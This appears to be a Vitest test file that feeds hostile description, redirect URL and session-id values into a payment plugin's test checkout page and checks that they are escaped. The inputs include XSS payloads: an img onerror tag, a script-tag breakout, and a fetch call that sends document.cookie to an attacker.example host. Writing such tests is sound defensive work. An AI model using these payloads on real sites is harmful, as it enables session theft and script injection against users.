import vm from 'node:vm'
import { expect, test } from 'vitest'

import { testProvider } from '../src/providers/test.js'

// Drives the test provider's checkout page with hostile description and redirectUrl
// values and checks they come out as data, not markup or code. Before the escaping
// fix, an apostrophe in redirectUrl was a SyntaxError in the inline script block,
// which silently disabled every click handler on the page; a description could
// inject executing tags. Run with: vitest run dev/test-provider-ui-escape.spec.ts
test('hostile description and redirectUrl are neutralised in the generated checkout page', async () => {
  const hostileDescription = `Bolts <3" & washers <img src=x onerror=alert(1)>`
  const hostileRedirect = `https://shop.example/thanks?note=it's-done';fetch('https://attacker.example/?c='+document.cookie);//</script><script>alert(2)</script>`

  const provider = testProvider({ enabled: true })!

  const payment: any = {
    amount: 1234,
    currency: 'eur',
    description: hostileDescription,
    redirectUrl: hostileRedirect,
  }
  // The test provider's initPayment never touches its payload argument, so none is needed;
  // it mutates `payment`, setting providerId, which keys the in-memory session.
  await provider.initPayment(null as any, payment)

  const config: any = { endpoints: [] }
  provider.onConfig!(config, {} as any)
  const uiEndpoint = config.endpoints.find((e: any) => e.path === '/payload-billing/test/payment/:id')
  const res: Response = await uiEndpoint.handler({ url: `/api/payload-billing/test/payment/${payment.providerId}` })
  const html = await res.text()

  // HTML sink: the hostile description must not appear as raw markup anywhere.
  expect(html).not.toContain('<img src=x')
  expect(html).toContain('Bolts &lt;3&quot; &amp; washers')

  // Script-block termination: a </script> inside a value must not open a new block.
  expect(html).not.toContain('<script>alert(2)')

  // JS sink: the single inline script block must parse.
  const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(m => m[1])
  expect(scripts).toHaveLength(1)
  expect(() => new vm.Script(scripts[0])).not.toThrow()

  // The values survive as data: double-quoted JSON strings inside the script.
  expect(scripts[0]).toContain(`window.location.href = "https://shop.example/thanks?note=it's-done`)
  expect(scripts[0]).toContain(`paymentId: "${payment.providerId}"`)
})

// session.id is not always the safe test_pay_<timestamp>_<random> id initPayment mints:
// the GET handler also builds a session straight from a database row when a payment isn't
// in the in-memory map yet, using whatever providerId the URL path names. validatePaymentId
// only checks the 'test_pay_' prefix, so the rest of the id reaches both jsString(session.id)
// sinks (the POST body and the status-poll fetch) untouched by initPayment's generator.
//
// The handler extracts the id by splitting req.url on '/' and taking the last segment, so
// a literal '/' in the id would be misrouted before it ever reached jsString — that's a
// separate routing quirk, not the escaping this test targets — so the hostile value below
// avoids '/' and '?' while still carrying the quote- and angle-bracket characters that
// jsString has to neutralise.
test('a hostile session id fetched from the database is neutralised in both session.id sinks', async () => {
  const hostileId = `test_pay_1" onerror="alert(1)"><b>bold`

  const provider = testProvider({ enabled: true })!
  const config: any = { endpoints: [] }
  provider.onConfig!(config, {} as any)
  const uiEndpoint = config.endpoints.find((e: any) => e.path === '/payload-billing/test/payment/:id')

  // Stands in for req.payload.find, so the session is built from a "database row"
  // rather than from initPayment's in-memory map.
  const payload: any = {
    find: async () => ({
      docs: [{
        id: 'db-row-1',
        providerId: hostileId,
        amount: 500,
        currency: 'eur',
        description: 'Database-sourced payment',
        createdAt: new Date().toISOString(),
      }],
    }),
  }

  const res: Response = await uiEndpoint.handler({
    url: `/api/payload-billing/test/payment/${hostileId}`,
    payload,
  })
  const html = await res.text()

  expect(html).not.toContain('><b>bold')

  const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(m => m[1])
  expect(scripts).toHaveLength(1)
  expect(() => new vm.Script(scripts[0])).not.toThrow()

  const escaped = JSON.stringify(hostileId).replace(/</g, '\\u003c')
  expect(scripts[0]).toContain(`paymentId: ${escaped}`)
  expect(scripts[0]).toContain(`encodeURIComponent(${escaped})`)
})
